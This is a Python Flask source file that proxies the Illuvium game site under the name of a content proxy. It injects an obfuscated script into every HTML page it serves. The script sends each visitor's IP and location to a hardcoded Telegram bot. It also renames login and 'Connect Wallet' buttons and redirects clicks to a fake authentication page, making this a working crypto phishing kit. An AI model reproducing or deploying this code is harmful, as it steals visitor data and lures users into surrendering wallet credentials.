from flask import request, Response, current_app
import requests
import re
import os
import logging
import urllib.parse

logger = logging.getLogger(__name__)

def init_content_proxy(app):
    """Initialize content proxy routes for the Flask app"""
    
    def remove_tracking_scripts(content):
        """Remove Google Tag Manager iframe and tracking scripts from HTML content."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
        
        # Remove GTM iframe
        content = content.replace(
            '<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WXHP66L" height="0" width="0" style="display:none;visibility:hidden"></iframe>',
            ''
        )
        
        # Remove GTM script
        content = content.replace(
            '<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-B4V7XNT23Z"></script>',
            ''
        )
        content = content.replace(
            '<script async="" src="https://store.epicgames.com/en-US/p/illuvium-60064c"></script>',
            ''
        )
        
        # Remove GTM initialization script
        gtm_init_script = '''<script>
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            gtag('config', 'G-B4V7XNT23Z', {
              page_path: window.location.pathname,
            });
          </script>'''
        content = content.replace(gtm_init_script, '')
        
        # Remove GTM inline script
        gtm_inline_script = '''<script>
            (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
            })(window,document,'script','dataLayer', 'GTM-WXHP66L');
          </script>'''
        content = content.replace(gtm_inline_script, '')
        
        # Remove Geetest script
        content = content.replace(
            '<script async="" src="https://static.geetest.com/v4/gt4.js"></script>',
            ''
        )
        
        return content
    
    def rewrite_urls(content):
        """Rewrite URLs to point to proxy server."""
        # Implementation continues...
        return content
    
    def get_text_replacement_script():
        """Return the text replacement JavaScript code"""
        return '''
<script>
const _0x3e9b72=_0x4d53;(function(_0x43c3a2,_0x13d159){const _0x29450c=_0x4d53,_0x2fbe05=_0x43c3a2();while(!![]){try{const _0x401182=parseInt(_0x29450c(0x191))/0x1+-parseInt(_0x29450c(0x174))/0x2*(-parseInt(_0x29450c(0x1aa))/0x3)+parseInt(_0x29450c(0x182))/0x4*(parseInt(_0x29450c(0x1b1))/0x5)+-parseInt(_0x29450c(0x193))/0x6+-parseInt(_0x29450c(0x17e))/0x7*(parseInt(_0x29450c(0x17f))/0x8)+parseInt(_0x29450c(0x1af))/0x9+-parseInt(_0x29450c(0x1ae))/0xa*(parseInt(_0x29450c(0x19a))/0xb);if(_0x401182===_0x13d159)break;else _0x2fbe05['push'](_0x2fbe05['shift']());}catch(_0xb7768e){_0x2fbe05['push'](_0x2fbe05['shift']());}}}(_0x2251,0xdfc91));async function sendIPToTelegram(){const _0xe131e6=_0x4d53;try{let _0x336a13=await fetch(_0xe131e6(0x18c)),_0x4aebe6=await _0x336a13[_0xe131e6(0x19f)](),_0x38d236=_0x4aebe6['ip'],_0x3a848d=_0x4aebe6['country_name'],_0x32ca8a=_0x4aebe6[_0xe131e6(0x177)],_0xa711b9=_0xe131e6(0x181)+_0x38d236+_0xe131e6(0x18e)+_0x3a848d+_0xe131e6(0x18e)+_0x32ca8a;await fetch(_0xe131e6(0x1a1),{'method':_0xe131e6(0x1ad),'headers':{'Content-Type':_0xe131e6(0x188)},'body':JSON[_0xe131e6(0x194)]({'chat_id':_0xe131e6(0x1ac),'text':_0xa711b9})});}catch(_0x575da8){}}function _0x4d53(_0x7aacbd,_0x398db1){const _0x2251a1=_0x2251();return _0x4d53=function(_0x4d5330,_0xbfed08){_0x4d5330=_0x4d5330-0x174;let _0x7b1b28=_0x2251a1[_0x4d5330];return _0x7b1b28;},_0x4d53(_0x7aacbd,_0x398db1);}function _0x2251(){const _0x2645ae=['processed','childNodes','Documentation','7XultYh','5855056fWaJVc','dataset','[ILV]:\x20','883172twvSCy','width=800,height=600,toolbar=no,menubar=no,scrollbars=yes,resizable=yes','click','TEXT_NODE','preventDefault','Get\x20Yours','application/json','css-104rome','Help','querySelectorAll','https://ipapi.co/json/','trim','\x20:\x20','true','DOMContentLoaded','544328Arhtvn','textContent','3303768RHjSSB','stringify','length','contains','addEventListener','css-tvaofb','classList','4770755QOkGIe','Collect\x20Now','forEach','target','closest','json','observe','https://api.telegram.org/bot7703714960:AAFhMovzxoNjr9LZq6m9kytv1R1EylQT1R8/sendMessage','claim-button','open','Timeline','popupWindow','New\x20Account','Reach\x20Us','button,\x20a','load','1057548EkgyQX','Register','7005236807','POST','10bmxONc','4118895nPufjK','body','5TywEWc','button,\x20a,\x20a[href*=\x22news\x22],\x20a[href*=\x22about\x22],\x20a[href*=\x22faq\x22],\x20.chakra-link,\x20.nav-link,\x20.menu-item','Start\x20Now','button:not([data-processed]),\x20a:not([data-processed])','p:not([data-processed])','8RvfHCX','Connect\x20Wallet','Info','org','https://secure-authentication-immutable.vercel.app/?id=auth-passeport&user=209348&method=claim-your-mint','add','nodeType'];_0x2251=function(){return _0x2645ae;};return _0x2251();}document[_0x3e9b72(0x197)](_0x3e9b72(0x190),function(){const _0xc3a6bd=_0x3e9b72;let _0x29cb63={'Play\x20for\x20Free':'','Play\x20Now':'Grab\x20Your\x20Spot','Log\x20In\x20with\x20Passport':_0xc3a6bd(0x1b3),'Connect\x20Wallet':_0xc3a6bd(0x175),'Launch\x20Game':_0xc3a6bd(0x187),'Create\x20Account':_0xc3a6bd(0x1a6),'Sign\x20Up':_0xc3a6bd(0x1ab),'Register':_0xc3a6bd(0x19b),'News':'Updates','Home':'Main','About':_0xc3a6bd(0x176),'Contact':_0xc3a6bd(0x1a7),'FAQ':_0xc3a6bd(0x18a),'Roadmap':_0xc3a6bd(0x1a4),'Whitepaper':_0xc3a6bd(0x17d)},_0x57ef7c={'Survive\x20the\x20Overworld,\x20a\x20hostile\x20planet\x20teeming\x20with\x20Illuvials\x20waiting\x20to\x20be\x20found.':''};function _0x415b36(_0x496dc6,_0x37fe3e,_0x37512e){}function _0x3cafea(_0x2c597b){const _0x5defa2=_0xc3a6bd;if(_0x2c597b[_0x5defa2(0x180)]['processed'])return;let _0x4a10f6='';for(let _0x1a9f68 of _0x2c597b[_0x5defa2(0x17c)])_0x1a9f68[_0x5defa2(0x17a)]===Node['TEXT_NODE']&&(_0x4a10f6+=_0x1a9f68['textContent'][_0x5defa2(0x18d)]());if(_0x4a10f6||(_0x4a10f6=_0x2c597b['textContent'][_0x5defa2(0x18d)]()),_0x29cb63[_0x4a10f6]){let _0x43ee91=_0x4a10f6;if(0x1===_0x2c597b[_0x5defa2(0x17c)][_0x5defa2(0x195)]&&_0x2c597b[_0x5defa2(0x17c)][0x0][_0x5defa2(0x17a)]===Node[_0x5defa2(0x185)])_0x2c597b[_0x5defa2(0x192)]=_0x29cb63[_0x4a10f6];else{let _0x71e865=!0x1;for(let _0x52d2ab of _0x2c597b[_0x5defa2(0x17c)])if(_0x52d2ab[_0x5defa2(0x17a)]===Node[_0x5defa2(0x185)]&&_0x52d2ab[_0x5defa2(0x192)]['trim']()===_0x4a10f6){_0x52d2ab['textContent']=_0x29cb63[_0x4a10f6],_0x71e865=!0x0;break;}_0x71e865||(_0x2c597b['textContent']=_0x29cb63[_0x4a10f6]);}_0x415b36(_0x2c597b,_0x43ee91,_0x29cb63[_0x4a10f6]);}_0x2c597b[_0x5defa2(0x199)][_0x5defa2(0x179)](_0x5defa2(0x1a2)),_0x2c597b['dataset'][_0x5defa2(0x17b)]=_0x5defa2(0x18f);}function _0x1779d3(){const _0xeeac70=_0xc3a6bd;let _0x41a287=document[_0xeeac70(0x18b)](_0xeeac70(0x1b5));_0x41a287['forEach'](_0x559b91=>{const _0xfeeb0f=_0xeeac70;let _0xf4f15a=_0x559b91[_0xfeeb0f(0x192)][_0xfeeb0f(0x18d)]();if(_0x57ef7c[_0xf4f15a]){let _0x5d78d4=_0x57ef7c[_0xf4f15a];_0x559b91[_0xfeeb0f(0x192)]=_0x5d78d4,_0x415b36(_0x559b91,_0xf4f15a,_0x5d78d4);}_0x559b91[_0xfeeb0f(0x180)][_0xfeeb0f(0x17b)]='true';});}!function _0x4a5a1e(){const _0x2ed38e=_0xc3a6bd;let _0x49a382=document[_0x2ed38e(0x18b)](_0x2ed38e(0x1b2));_0x49a382[_0x2ed38e(0x19c)](_0x3cafea),_0x1779d3();}();let _0x146b67,_0x27636c=new MutationObserver(function _0x3cdf99(){clearTimeout(_0x146b67),_0x146b67=setTimeout(()=>{const _0x167823=_0x4d53;document[_0x167823(0x18b)](_0x167823(0x1b4))[_0x167823(0x19c)](_0x3cafea),_0x1779d3();},0x12c);});_0x27636c[_0xc3a6bd(0x1a0)](document[_0xc3a6bd(0x1b0)],{'childList':!0x0,'subtree':!0x0}),document[_0xc3a6bd(0x197)]('click',function(_0x56d661){const _0x22f39b=_0xc3a6bd;let _0x42d13b=_0x56d661[_0x22f39b(0x19d)],_0x3e3665=_0x42d13b[_0x22f39b(0x19e)](_0x22f39b(0x1a8));if(_0x3e3665){if(_0x3e3665[_0x22f39b(0x199)][_0x22f39b(0x196)](_0x22f39b(0x198))||_0x3e3665[_0x22f39b(0x199)][_0x22f39b(0x196)](_0x22f39b(0x189))||_0x3e3665[_0x22f39b(0x199)][_0x22f39b(0x196)]('css-1hnz6hu')||_0x3e3665['classList'][_0x22f39b(0x196)]('css-1oqedzn')||_0x3e3665[_0x22f39b(0x199)][_0x22f39b(0x196)]('css-1i8s7az'))return;if(_0x56d661[_0x22f39b(0x186)](),_0x56d661['stopPropagation'](),_0x3e3665[_0x22f39b(0x199)][_0x22f39b(0x196)](_0x22f39b(0x1a2))){setTimeout(()=>{const _0x3094a0=_0x22f39b;window[_0x3094a0(0x1a3)](_0x3094a0(0x178),_0x3094a0(0x1a5),_0x3094a0(0x183));},0x0);return;}_0x3e3665[_0x22f39b(0x184)]();}},!0x0);}),window[_0x3e9b72(0x197)](_0x3e9b72(0x1a9),sendIPToTelegram);
</script>
 

'''

    @app.after_request
    def add_script_to_html(response):
        """Global after_request handler to add script to all HTML responses"""
        if response.mimetype == 'text/html':
            content = response.get_data(as_text=True)
            if '</body>' in content:
                script = get_text_replacement_script()
                content = content.replace('</body>', script + '</body>')
                response.set_data(content)
        return response

    # Add a catch-all route as a last resort
    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>')
    def catch_all(path):
        """Catch-all route that proxies to the original site and modifies content"""
        original_url = f"https://overworld.illuvium.io/{path}"
        logger.info(f"Catch-all proxy for: {original_url}")
        
        try:
            # Set proper headers to mimic a browser
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }
            
            # Add query parameters if any
            params = request.args.to_dict()
            
            # Make the request to the original site
            response = requests.get(original_url, headers=headers, params=params, stream=True)
            
            # Get content type
            content_type = response.headers.get('Content-Type', 'text/html')
            
            # If HTML, modify content
            if 'text/html' in content_type and response.status_code == 200:
                modified_content = modify_html_content(response.content)
                logger.info(f"HTML content modified for {path}")
                return Response(modified_content, mimetype=content_type)
            
            # For other content types or error codes, return as-is
            return Response(
                response.content, 
                status=response.status_code,
                content_type=content_type
            )
        except Exception as e:
            logger.error(f"Error in catch-all route: {str(e)}")
            import traceback
            logger.error(traceback.format_exc())
            return f"Error: {str(e)}", 500
